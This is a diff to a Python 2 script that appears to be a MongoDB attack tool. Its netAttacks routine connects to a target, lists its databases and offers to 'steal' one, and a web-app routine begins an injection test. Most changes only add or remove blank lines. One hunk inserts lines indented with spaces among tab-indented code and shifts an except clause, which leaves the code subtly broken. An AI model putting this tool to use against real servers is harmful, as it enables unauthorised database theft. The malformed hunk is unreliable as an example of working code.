@@ -36,10 +36,6 @@ if TEST:
 	import testing
 	testing.testUnit()
 
-
-
-
-
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 # global optionSet
 # optionSet = [False,False,False,False,False,False]
@@ -114,9 +110,6 @@ def netAttacks():
 	
 		except:
 			print "MongoDB port closed."
-		
-		
-	
 	
 	elif srvNeedCreds == "y" or srvNeedCreds == "Y":
 		srvUser = raw_input("Enter server username: ")
@@ -125,30 +118,15 @@ def netAttacks():
 
 		try:
 			conn = pymongo.MongoClient(uri)
-		except:
+            print "MongoDB authenticated on " + target + ":27017!"
+            mgtOpen = True
+        except:
 			print "something happened."
 			mainMenu()
 	
 	
 	mgtUrl = "http://" + target + ":28017"
 	try:		
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 		#Future rev:  Add web management interface parsing
@@ -172,6 +150,9 @@ def netAttacks():
 		print "List of databases:"
 		dbList = conn.database_names()
 		print "\n".join(dbList)
+
+
+
 
 		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
 
@@ -222,8 +203,6 @@ def webApps():
 			end = time.time()
 			timeReq.close()
 			timeBase = round((end - start), 3)
-
-
 
 			print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
 			appUp = True
